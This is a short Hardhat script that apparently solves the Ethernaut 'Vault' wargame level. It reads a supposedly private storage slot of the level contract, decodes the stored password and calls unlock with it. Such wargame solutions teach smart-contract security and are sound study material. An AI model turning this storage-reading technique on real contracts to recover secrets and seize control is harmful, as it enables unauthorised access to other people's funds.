const { ethers, waffle } = require("hardhat");
var fs = require("fs");
const chalk = require('chalk');


function hex_to_ascii(str1) {
    var hex = str1.toString();
    var str = '';
    for (var n = 0; n < hex.length; n += 2) {
        str += String.fromCharCode(parseInt(hex.substr(n, 2), 16));
    }
    return str;
}

async function main() {
    const level_instance_address = "0xA8EEe4D1bAfC6e22e1d22B585999C5a85cBBb186" // ethernaut's deployed contract
    const [deployer] = await ethers.getSigners();
    const provider = waffle.provider;

    // load contract using ABI and address
    var jsonFile = "artifacts/solutions/level8-vault/vault.sol/Vault.json"; // hardhat compiles first
    var parsed = JSON.parse(fs.readFileSync(jsonFile));
    var contractABI = parsed.abi;
    const contract = new ethers.Contract(level_instance_address, contractABI, provider);

    // get storage and decode
    const data_ = await provider.getStorageAt(level_instance_address, 1);
    console.log(data_);
    password = hex_to_ascii(data_).slice(1,);
    console.log(chalk.red("Password is:", password));

    // call unlock function of the contract
    const signer = contract.connect(provider.getSigner());
    await signer.unlock(ethers.utils.hexlify(ethers.utils.toUtf8Bytes(password)));


    // TODO: figure out why this way didn't work and how to decode directly from etherscan
    //data = "0xdfc86b17000000000000000000000000f94b476063b6379a3c8b6c836efb8b3e10ede188" ??
    //console.log(chalk.red(hex_to_ascii(data)));
    // hex_data = ethers.utils.defaultAbiCoder.decode(
    //     ['bytes32'],
    //     ethers.utils.hexDataSlice(data, 1)
    // );
    // console.log("Decoding hex", hex_data[0]);

}


main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });